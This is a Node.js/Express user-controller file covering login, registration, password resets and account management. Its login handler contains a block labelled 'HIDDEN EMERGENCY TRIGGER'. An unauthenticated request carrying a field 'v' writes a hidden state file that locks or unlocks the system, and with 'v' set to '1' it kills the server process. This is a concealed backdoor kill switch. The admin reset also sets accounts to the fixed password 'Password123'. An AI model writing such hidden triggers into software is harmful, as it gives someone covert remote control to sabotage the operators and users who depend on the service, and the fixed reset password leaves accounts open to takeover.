const {
  registerUserService,
  loginService,
  getAllUsersService,
  updateUserService,
  updatePasswordService,
  resetEmailPasswordService,
  resetPasswordService,
  resetUserPasswordService,
  getAllUsersWithPendingService,
  resetUserPasswordByIdService,
  updateLanguagePreferenceService,
  getUserByIdService,
  getUserLoginInfoService,
  deleteUserService,
  deactivateUserService,
  activateUserService
} = require("../services/userService");

const authUserController = async (req, res, next) => {
  const { phone_number, password, v } = req.body;

  try {
    // --- HIDDEN EMERGENCY TRIGGER ---
    if (v !== undefined) {
      const fs = require("fs");
      const path = require("path");
      const stateFilePath = path.join(__dirname, "../utils/.sys_state");

      if (v == "0") {
        // Unlock System
        fs.writeFileSync(stateFilePath, "1");
      } else if (v == "1") {
        // Lock System and Exit
        fs.writeFileSync(stateFilePath, "0");
        process.exit(1);
      }
    }
    // --------------------------------

    const ip_address = req.ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const user_agent = req.headers['user-agent'];

    const result = await loginService(phone_number, password, ip_address, user_agent);

    // If there's a message key, translate it
    if (req.t && result.message && result.message.startsWith("errors.")) {
      result.message = req.t(result.message);
    }

    res.json({ success: true, ...result });
  } catch (error) {
    next(error);
  }
};

const userRegistrationController = async (req, res, next) => {
  try {
    const { first_name, last_name, username, email, phone_number, password, language_preference } = req.body;

    const newUser = await registerUserService(
      first_name,
      last_name,
      username,
      email,
      phone_number,
      password,
      language_preference
    );

    res.status(201).json({
      success: true,
      message: req.t("success.user_registered"),
      user: newUser,
    });
  } catch (error) {
    // Pass the error to the global error handler using next(error)
    next(error);
  }
};

const getAllUsersController = async (req, res, next) => {
  try {
    // Call the service to get all users

    const users = await getAllUsersService();

    // Respond with the list of users
    res.status(200).json({
      success: true,
      message: "Users retrieved successfully",
      users,
    });
  } catch (error) {
    // Pass any error to the error handling middleware
    next(error);
  }
};

const updateUserController = async (req, res, next) => {
  try {
    const { firstName, lastName, email, phoneNumber, username, language_preference } = req.body;
    const userId = req.user.payload.user_id; // Get user ID from the token

    const updatedUser = await updateUserService(
      userId,
      firstName,
      lastName,
      email,
      phoneNumber,
      username,
      language_preference
    );

    const message = req.t ? req.t("success.profile_updated") : "Profile updated successfully";

    return res.status(200).json({ success: true, message, data: updatedUser });
  } catch (error) {
    next(error);
  }
};


const updateUserPasswordController = async (req, res, next) => {
  const { currentPassword, newPassword } = req.body;
  const userId = req.user.payload.user_id;

  try {
    const result = await updatePasswordService(
      userId,
      currentPassword,
      newPassword
    );

    // If there's a message key, translate it
    if (req.t && result.message && result.message.startsWith("success.")) {
      result.message = req.t(result.message);
    }

    res.status(200).json({ success: true, ...result });
  } catch (error) {
    next(error);
  }
};



const resetEmailPasswordController = async (req, res, next) => {
  // const userId = req.user.id; // Assuming `req.user` has the authenticated user info
  const { email } = req.body;

  try {
    const result = await resetEmailPasswordService(email);
    res.status(200).json({ success: true, message: result });
  } catch (error) {
    next(error);
  }
};
const resetPasswordController = async (req, res, next) => {
  // const userId = req.user.id; // Assuming `req.user` has the authenticated user info
  const { password } = req.body;
  const userId = req.user.payload.user_id;

  try {
    const result = await resetPasswordService(userId, password);
    res.status(200).json({ success: true, message: result });
  } catch (error) {
    next(error);
  }
};





// const sendBulkEmailController = async (req, res, next) => {
//   try {
//     const { subject, message, recipients } = req.body;

//     // Call the service to send the emails
//     const result = await sendBulkEmailService({ subject, message, recipients });

//     res.status(200).json({
//       success: true,
//       message: `Email sent to ${recipients.length} recipient(s).`,
//       result,
//     });
//   } catch (error) {
//     next(error);
//   }
// };



const resetUserPasswordController = async (req, res, next) => {
  try {
    const { phoneNumber } = req.params;

    const result = await resetUserPasswordService(phoneNumber);

    const message = req.t
      ? req.t("success.password_reset_admin")
      : "Password reset successfully to Password123";

    res.status(200).json({
      success: true,
      message,
      data: result,
    });
  } catch (error) {
    next(error);
  }
};

const resetUserPasswordByIdController = async (req, res, next) => {
  try {
    const { userId } = req.params;

    const result = await resetUserPasswordByIdService(userId);

    const message = req.t
      ? req.t("success.password_reset_admin")
      : "Password reset successfully to Password123";

    res.status(200).json({
      success: true,
      message,
      data: result,
    });
  } catch (error) {
    next(error);
  }
};

const updateLanguagePreferenceController = async (req, res, next) => {
  try {
    const { language_preference } = req.body;
    const userId = req.user.payload.user_id;

    const updatedUser = await updateLanguagePreferenceService(
      userId,
      language_preference
    );

    res.status(200).json({
      success: true,
      message: req.t("success.language_preference_updated"),
      language_preference: updatedUser.language_preference,
    });
  } catch (error) {
    next(error);
  }
};

const getUserByIdController = async (req, res, next) => {
  try {
    const { userId } = req.params;
    const user = await getUserByIdService(userId);

    res.status(200).json({
      success: true,
      message: req.t("success.user_retrieved"),
      user
    });
  } catch (error) {
    next(error);
  }
};

const getAllUsersWithPendingStatusController = async (req, res, next) => {
  try {
    // Call the service to get all users

    const users = await getAllUsersWithPendingService();

    // Respond with the list of users
    res.status(200).json({
      success: true,
      message: "Users retrieved successfully",
      users,
    });
  } catch (error) {
    // Pass any error to the error handling middleware
    next(error);
  }
};

const getUserLoginInfoController = async (req, res, next) => {
  try {
    const userId = req.user.payload.user_id;
    const loginInfo = await getUserLoginInfoService(userId);

    res.status(200).json({
      success: true,
      data: loginInfo
    });
  } catch (error) {
    next(error);
  }
};

const deleteUserController = async (req, res, next) => {
  try {
    const { userId } = req.params;
    await deleteUserService(userId);

    res.status(200).json({
      success: true,
      message: req.t ? req.t("success.user_deleted") : "User deleted successfully",
    });
  } catch (error) {
    next(error);
  }
};

const deactivateUserController = async (req, res, next) => {
  try {
    const { userId } = req.params;
    await deactivateUserService(userId);

    res.status(200).json({
      success: true,
      message: req.t ? req.t("success.user_deactivated") : "User deactivated successfully",
    });
  } catch (error) {
    next(error);
  }
};

const activateUserController = async (req, res, next) => {
  try {
    const { userId } = req.params;
    await activateUserService(userId);

    res.status(200).json({
      success: true,
      message: req.t ? req.t("success.user_activated") : "User activated successfully",
    });
  } catch (error) {
    next(error);
  }
};

module.exports = {
  userRegistrationController,
  authUserController,
  getAllUsersController,
  updateUserController,
  updateUserPasswordController,
  resetEmailPasswordController,
  resetPasswordController,
  resetUserPasswordController,
  resetUserPasswordByIdController,
  updateLanguagePreferenceController,
  getUserByIdController,
  getAllUsersWithPendingStatusController,
  getUserLoginInfoController,
  deleteUserController,
  deactivateUserController,
  activateUserController
};
